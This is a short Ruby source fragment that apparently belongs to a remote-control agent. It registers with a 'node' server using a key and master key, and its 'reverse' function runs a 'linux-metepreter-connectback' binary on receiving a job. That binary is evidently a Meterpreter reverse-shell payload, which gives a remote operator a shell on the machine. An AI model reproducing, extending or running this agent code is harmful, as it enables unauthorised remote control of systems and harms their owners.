def fetch(host, port, url)
        #puts url
        begin
                http = Net::HTTP.new(host, port)
                response = http.get(url)
        rescue Errno::ECONNREFUSED
                return "Error: Connection Refused"
        rescue Timeout::Error
                return "Error: Connection Timeout"
        end
        return response
end

def init(host, port, key, masterkey)
#       authresp = auth(host, port, key, masterkey) 
        regresp = register(host, port, key, masterkey)
        return regresp # authresp
end

def auth(host, port, key, masterkey)
        response = fetch(host, port, "/node/#{key}/auth/#{masterkey}/noop")
        return response
end

def register(host, port, key, masterkey)
        response = fetch(host, port, "/node/#{key}/register/#{masterkey}/optional2")
        return response
end

def reverse(job)
        job = job.split(":")
        puts job.length
        `tests/linux-metepreter-connectback`
end

